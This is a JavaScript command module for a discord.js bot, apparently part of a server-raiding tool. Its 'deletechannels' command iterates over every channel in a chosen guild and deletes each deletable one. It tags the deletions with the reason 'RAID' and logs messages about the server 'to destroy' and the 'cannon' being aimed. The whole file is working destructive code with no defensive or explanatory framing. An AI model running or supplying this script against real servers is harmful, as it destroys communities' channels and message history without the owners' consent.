let discord = require("discord.js")
let fs = require("fs")
module.exports = {
    triggers: ["deletechannels", "delchannels", "rmchannels"],
    description: "Deletes all channels in selected guild.",
    run(client = new discord.Client(), args, starget,ctarget) {
        if (!ctarget) return console.log("Please select a server to destroy.")
        if (!client.guilds.resolve(ctarget)) return console.log("The guild the cannon was aimed to is invalid. Did the bot get removed from the server or did you manipulate the files?")
        client.guilds.resolve(ctarget).channels.cache.forEach(b => {
            if (b.deletable) {b.delete("RAID");console.log("Deleting "+b.name)}
        })
        console.log("All channels removed.")
    }
}